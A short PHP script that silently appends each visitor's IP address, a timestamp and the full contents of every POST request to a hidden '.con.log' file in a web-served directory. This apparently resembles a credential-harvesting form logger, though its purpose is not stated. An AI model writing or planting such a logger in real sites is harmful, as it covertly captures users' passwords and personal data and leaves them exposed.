<?php
$file = "/var/www/html/slipstream/sizes/.con.log";
file_put_contents($file, getenv('REMOTE_ADDR')." ".time().": ".print_r(@$_POST, true)."\n", FILE_APPEND | LOCK_EX);
?>
